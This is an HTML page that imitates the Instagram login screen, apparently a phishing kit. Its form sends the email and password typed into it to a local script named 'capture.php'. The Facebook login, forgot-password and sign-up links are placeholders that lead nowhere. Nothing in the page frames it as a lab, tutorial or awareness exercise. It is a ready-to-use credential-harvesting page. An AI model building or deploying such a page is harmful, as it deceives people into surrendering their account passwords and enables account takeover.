<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login &#183; Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <img src="Instagram-Logo-2016-present.png">
        <form action="./capture.php" method="POST">
            <input class="input-field" name="email" type="email" placeholder="Email" required>
            <input class="input-field" name="password" type="password" placeholder="Password" required>
            <button class="login-button" type="submit">Log in</button>
        </form>
        <div class="divider">
            <span>OR</span>
        </div>
        <div class="facebook-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
            Log in with Facebook
        </div>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>